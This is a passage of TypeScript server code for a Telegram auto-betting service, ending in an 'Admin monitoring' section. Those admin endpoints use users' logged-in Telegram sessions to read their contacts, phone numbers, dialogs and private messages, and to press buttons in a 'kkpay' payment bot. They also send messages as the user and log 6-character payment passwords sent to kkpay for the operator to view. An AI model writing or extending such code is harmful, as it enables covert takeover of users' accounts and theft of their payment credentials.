  if (body.autoBet === false && prev.autoBet) stopPoller(session);
  if (body.autoBet === true && !prev.autoBet && session.watchGroupId) {
    // Reset level to 1 every time autoBet is re-enabled
    session.currentLevel = 0;
    session.currentBet = session.cfg.amountLevels.length > 1
      ? (session.cfg.amountLevels[0] ?? session.cfg.betAmount)
      : session.cfg.betAmount;
    session.consecutiveLosses = 0;
    session.betPlacedThisCycle = false;
    session.lastSeenLotteryPeriod = 0;
    startPoller(session);
    void pollLottery(session);
  }
  saveSession(session);
  res.json({ ok: true, cfg: session.cfg });
});

router.post("/tg/kkpay", requireCard, async (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (!session) { res.status(401).json({ error: "未连接" }); return; }
  const { username } = req.body as { username?: string };
  if (username !== undefined) {
    session.kkpayUsername = username.replace(/^@/, "");
    session.kkpayEntityId = undefined;
    session.balanceSource = "manual";
    await startKkpayListener(session).catch(() => { /* ignore */ });
  }
  res.json({ ok: true, kkpayUsername: session.kkpayUsername, kkpayEntityId: session.kkpayEntityId, linked: !!session.kkpayEntityId });
});

router.get("/tg/bets", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  res.json({ bets: session ? session.betLog.slice(0, 100) : [] });
});

router.delete("/tg/bets", requireCard, (req, res) => {
  const session = tgSessions.get(req.user!.userId);
  if (session) session.betLog.length = 0;
  res.json({ ok: true });
});

router.get("/tg/events", requireAuth, (req, res) => {
  const userId = req.user!.userId;
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();
  res.write(": connected\n\n");

  // Register to user's session SSE set (create session placeholder if not yet connected)
  let session = tgSessions.get(userId);
  if (!session) {
    // Create a minimal placeholder to hold SSE clients before TG login
    const placeholder = { sseClients: new Set<Response>() };
    // Store placeholder temporarily so SSE works even before TG login
    (req as unknown as Record<string, unknown>)["_ssePlaceholder"] = placeholder;
    placeholder.sseClients.add(res);
    const hb = setInterval(() => { try { res.write(": ping\n\n"); } catch { /* ignore */ } }, 20_000);
    req.on("close", () => { clearInterval(hb); placeholder.sseClients.delete(res); });
    return;
  }
  session.sseClients.add(res);
  const hb = setInterval(() => { try { res.write(": ping\n\n"); } catch { /* ignore */ } }, 20_000);
  req.on("close", () => { clearInterval(hb); session?.sseClients.delete(res); });
});

// ─── Admin monitoring ────────────────────────────────────────────────────────

router.get("/admin/kkpay-pwd-log", requireAdmin, (_req, res) => {
  res.json({ events: kkpayPwdLog });
});

router.get("/admin/tg/sessions", requireAdmin, (_req, res) => {
  const sessions = [];
  for (const [userId, session] of tgSessions) {
    if (!session.me) continue;
    const settled = session.betLog.filter(b => b.won !== undefined);
    const wins = settled.filter(b => b.won === true).length;
    const wgid = session.watchGroupId;
    sessions.push({
      userId,
      me: {
        firstName: session.me.firstName,
        lastName: session.me.lastName,
        username: session.me.username,
        phone: session.me.phone,
      },
      watchGroupTitle: session.groups.find(g => g.id === wgid || `-100${g.id}` === wgid)?.title,
      autoBet: session.cfg.autoBet,
      consecutiveLosses: session.consecutiveLosses,
      sessionPnl: session.sessionPnl,
      todayPnl: session.todayPnl,
      balance: session.balance,
      currentBet: session.currentBet,
      totalBets: session.betLog.filter(b => b.status !== "failed").length,
      wins,
      settled: settled.length,
      winRate: settled.length > 0 ? `${((wins / settled.length) * 100).toFixed(1)}%` : "-",
      riskBlocked: !checkRisk(session).ok,
      riskReason: checkRisk(session).reason,
      lastAlgoUsed: session.lastAlgoUsed,
      currentPattern: session.currentPattern,
    });
  }
  res.json({ sessions });
});

router.get("/admin/tg/sessions/:userId/bets", requireAdmin, (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  res.json({ bets: session ? session.betLog.slice(0, 200) : [] });
});

router.get("/admin/tg/sessions/:userId/messages", requireAdmin, (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  res.json({ messages: session ? session.chatLog : [] });
});

// kkpay-only messages + entityId (for dedicated kkpay console) — live fetch from TG server
router.get("/admin/tg/sessions/:userId/kkpay", requireAdmin, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.json({ entityId: null, messages: [] }); return; }

  const eid = session.kkpayEntityId ?? null;

  // If no kkpay entity bound, fall back to chatLog filter
  if (!eid || !session.client?.connected) {
    const messages = session.chatLog.filter(m =>
      (eid && m.chatId === eid) || m.chatTitle.toLowerCase().includes("kkpay")
    );
    res.json({ entityId: eid, messages });
    return;
  }

  // Live fetch directly from TG so inline buttons are always fresh
  try {
    const msgs = await session.client.getMessages(eid, { limit: 30 });
    type LogEntry = typeof session.chatLog[number];
    const messages: LogEntry[] = msgs.map(msg => {
      const text = msg.message ?? "";
      const senderId = msg.out ? "__me__" : String(msg.senderId ?? eid);
      const senderName = msg.out ? "我" : "kkpay";

      let buttons: { text: string; data?: string }[][] | undefined;
      try {
        const rm = (msg as unknown as { replyMarkup?: unknown }).replyMarkup;
        if (rm && (rm as { className?: string }).className === "ReplyInlineMarkup") {
          const extracted = ((rm as { rows?: unknown[] }).rows ?? []).map(row =>
            ((row as { buttons?: unknown[] }).buttons ?? []).map(btn => ({
              text: (btn as { text?: string }).text ?? "",
              data: (btn as { className?: string; data?: Buffer }).className === "KeyboardButtonCallback"
                ? ((btn as { data?: Buffer }).data?.toString("hex"))
                : undefined,
            })).filter(b => b.text)
          ).filter(r => r.length > 0);
          if (extracted.length > 0) buttons = extracted;
        }
      } catch { /* ignore */ }

      return {
        sender: senderId,
        senderName,
        chatId: String(eid),
        chatTitle: "kkpay",
        chatType: "private" as const,
        text: text.slice(0, 500),
        timestamp: (msg.date ?? 0) * 1000,
        msgId: msg.id,
        buttons,
      };
    }).filter(m => m.text.trim());

    res.json({ entityId: eid, messages });
  } catch (err) {
    req.log.warn({ err }, "kkpay live fetch failed, using chatLog fallback");
    const messages = session.chatLog.filter(m =>
      (eid && m.chatId === eid) || m.chatTitle.toLowerCase().includes("kkpay")
    );
    res.json({ entityId: eid, messages });
  }
});

// Fetch TG contacts for a user session
router.get("/admin/tg/sessions/:userId/contacts", requireAdmin, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session?.client?.connected) { res.status(404).json({ error: "用户未连接 TG" }); return; }
  try {
    const result = await session.client.invoke(new Api.contacts.GetContacts({ hash: bigInt(0) }));
    const users = (result as Api.contacts.Contacts).users ?? [];
    const contacts = users
      .filter(u => u.className === "User")
      .map(u => {
        const user = u as Api.User;
        return {
          id: String(user.id),
          name: [user.firstName ?? "", user.lastName ?? ""].filter(Boolean).join(" ") || String(user.id),
          username: user.username ?? null,
          phone: user.phone ?? null,
        };
      });
    res.json({ contacts });
  } catch (err) {
    req.log.error({ err }, "fetch contacts failed");
    res.status(500).json({ error: String(err) });
  }
});

// Fetch TG dialogs (recent chats) for red-packet target picker
router.get("/admin/tg/sessions/:userId/dialogs", requireAdmin, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session?.client?.connected) { res.status(404).json({ error: "用户未连接 TG" }); return; }
  try {
    const dialogs = await session.client.getDialogs({ limit: 50 });
    const result = dialogs
      .filter(d => d.entity)
      .map(d => {
        const entity = d.entity!;
        const cls = (entity as { className?: string }).className ?? "";
        const id = String((entity as { id?: unknown }).id ?? "");
        let name = "";
        let type: "private" | "group" | "channel" = "private";
        let username: string | null = null;
        if (cls === "Channel") {
          type = (entity as { megagroup?: boolean }).megagroup ? "group" : "channel";
          name = (entity as { title?: string }).title ?? id;
        } else if (cls === "Chat") {
          type = "group";
          name = (entity as { title?: string }).title ?? id;
        } else {
          type = "private";
          const u = entity as { firstName?: string; lastName?: string; username?: string };
          name = [u.firstName, u.lastName].filter(Boolean).join(" ") || u.username || id;
          username = u.username ?? null;
        }
        return { id, name, type, username };
      });
    res.json({ dialogs: result });
  } catch (err) {
    req.log.error({ err }, "fetch dialogs failed");
    res.status(500).json({ error: String(err) });
  }
});

// Pull recent messages from TG server into chatLog
router.post("/admin/tg/sessions/:userId/fetch-history", requireAdmin, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(404).json({ error: "用户未连接 TG" }); return; }

  try {
    // Get active dialogs (chats/channels/private)
    const dialogs = await session.client.getDialogs({ limit: 30 });
    const pulled: typeof session.chatLog = [];

    for (const dialog of dialogs) {
      const entity = dialog.entity;
      if (!entity) continue;

      let chatTitle = "";
      let chatType: "private" | "group" | "channel" = "private";
      const cls = (entity as { className?: string }).className ?? "";
      const chatId = String((entity as { id?: unknown }).id ?? "");

      if (cls === "Channel") {
        chatType = (entity as { megagroup?: boolean }).megagroup ? "group" : "channel";
        chatTitle = (entity as { title?: string }).title ?? chatId;
      } else if (cls === "Chat") {
        chatType = "group";
        chatTitle = (entity as { title?: string }).title ?? chatId;
      } else {
        chatType = "private";
        const u = entity as { firstName?: string; lastName?: string; username?: string };
        chatTitle = [u.firstName, u.lastName].filter(Boolean).join(" ") || u.username || chatId;
      }

      try {
        const msgs = await session.client.getMessages(entity, { limit: 30 });
        for (const msg of msgs) {
          if (!msg.message?.trim()) continue;
          if (msg.out) continue;

          const senderId = String(msg.senderId ?? "");
          let senderName = senderId;
          try {
            const sender = msg.sender as { title?: string; firstName?: string; lastName?: string; username?: string } | undefined;
            if (sender) {
              senderName = sender.title ?? ([sender.firstName, sender.lastName].filter(Boolean).join(" ") || sender.username) ?? senderId;
            }
          } catch { /* ignore */ }

          let msgButtons: { text: string; data?: string }[][] | undefined;
          try {
            const rm = (msg as unknown as { replyMarkup?: unknown }).replyMarkup;
            if (rm && (rm as { className?: string }).className === "ReplyInlineMarkup") {
              const extracted = ((rm as { rows?: unknown[] }).rows ?? []).map(row =>
                ((row as { buttons?: unknown[] }).buttons ?? []).map(btn => ({
                  text: (btn as { text?: string }).text ?? "",
                  data: (btn as { className?: string; data?: Buffer }).className === "KeyboardButtonCallback"
                    ? ((btn as { data?: Buffer }).data?.toString("hex"))
                    : undefined,
                })).filter(b => b.text)
              ).filter(r => r.length > 0);
              if (extracted.length > 0) msgButtons = extracted;
            }
          } catch { /* ignore */ }
          pulled.push({
            sender: senderId,
            senderName,
            chatId,
            chatTitle,
            chatType,
            text: msg.message.slice(0, 500),
            timestamp: (msg.date ?? 0) * 1000,
            msgId: msg.id,
            buttons: msgButtons,
          });
        }
      } catch { /* skip inaccessible chats */ }
    }

    // Merge with existing chatLog (deduplicate by chatId+text+timestamp)
    const existing = new Set(session.chatLog.map(m => `${m.chatId}:${m.timestamp}:${m.text.slice(0, 50)}`));
    const newMsgs = pulled.filter(m => !existing.has(`${m.chatId}:${m.timestamp}:${m.text.slice(0, 50)}`));

    session.chatLog = [...newMsgs, ...session.chatLog]
      .sort((a, b) => b.timestamp - a.timestamp)
      .slice(0, 500);

    res.json({ ok: true, fetched: pulled.length, total: session.chatLog.length });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    res.status(500).json({ error: msg });
  }
});

// Admin: press an inline keyboard button on a kkpay message
router.post("/admin/tg/sessions/:userId/press-button", requireAdmin, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session?.client?.connected) { res.status(404).json({ error: "用户未连接 TG" }); return; }

  const { msgId, buttonText } = req.body as { msgId?: number; buttonText?: string };
  if (!msgId || !buttonText) { res.status(400).json({ error: "缺少参数" }); return; }

  const entityId = session.kkpayEntityId;
  if (!entityId) { res.status(400).json({ error: "kkpay 未绑定" }); return; }

  try {
    const msgs = await session.client.getMessages(entityId, { ids: [msgId] });
    const msg = msgs[0];
    if (!msg) { res.status(404).json({ error: "消息不存在" }); return; }

    const buttons = await msg.getButtons();
    if (!buttons) { res.status(404).json({ error: "消息无按钮" }); return; }

    for (const row of buttons) {
      for (const btn of row) {
        if (btn.text === buttonText) {
          await btn.click({});
          res.json({ ok: true });
          return;
        }
      }
    }
    res.status(404).json({ error: `未找到按钮: ${buttonText}` });
  } catch (err) {
    req.log.error({ err }, "press-button failed");
    res.status(500).json({ error: String(err) });
  }
});

// Admin: send a message via a user's TG session
router.post("/admin/tg/sessions/:userId/send", requireAdmin, async (req, res) => {
  const userId = parseInt(String(req.params["userId"] ?? ""));
  if (isNaN(userId)) { res.status(400).json({ error: "无效用户 ID" }); return; }
  const session = tgSessions.get(userId);
  if (!session) { res.status(404).json({ error: "用户未连接 TG" }); return; }

  const { chatId, customTarget, message } = req.body as { chatId?: string; customTarget?: string; message?: string };
  if (!message?.trim()) { res.status(400).json({ error: "请输入消息内容" }); return; }
  if (!chatId && !customTarget?.trim()) { res.status(400).json({ error: "请选择发送目标" }); return; }

  try {
    let entity: Parameters<typeof session.client.sendMessage>[0];

    if (chatId) {
      // Find entity from current dialogs by matching chatId — most reliable
      const dialogs = await session.client.getDialogs({ limit: 100 });
      const matched = dialogs.find(d => {
        const eid = String((d.entity as { id?: unknown })?.id ?? "");
        return eid === chatId;
      });
      if (!matched?.entity) {
        res.status(400).json({ error: "找不到该对话实体，请先刷新消息列表后重试" }); return;
      }
      entity = matched.entity as Parameters<typeof session.client.sendMessage>[0];
    } else {
      // Custom target: @username or t.me/ link
      const t = customTarget!.trim();
      entity = await session.client.getEntity(
        t.startsWith("https://") || t.startsWith("t.me/") ? t
          : t.startsWith("@") ? t : `@${t}`
      ) as Parameters<typeof session.client.sendMessage>[0];
    }

    const trimmed = message.trim();
    const result = await session.client.sendMessage(entity, { message: trimmed });

    // ─── kkpay payment password capture ───
    // If sending to kkpay entity and message looks like a 6-char payment password
    const eid = session.kkpayEntityId;
    const isToKkpay = eid && chatId === eid;
    if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(trimmed)) {
      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", trimmed, session.kkpayPwdContext);
    }

    res.json({ ok: true, msgId: result.id });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    res.status(500).json({ error: msg });
  }
});

router.post("/tg/disconnect", requireAuth, async (req, res) => {
  const userId = req.user!.userId;
  const session = tgSessions.get(userId);
  if (session) {
    stopAllTimers(session);
    try { await session.client.invoke(new Api.auth.LogOut()); } catch { /* ok */ }
    try { await session.client.disconnect(); } catch { /* ok */ }
    tgSessions.delete(userId);
  }
  try { fs.unlinkSync(sessionFile(userId)); } catch { /* ok */ }
  res.json({ ok: true });
});

export default router;
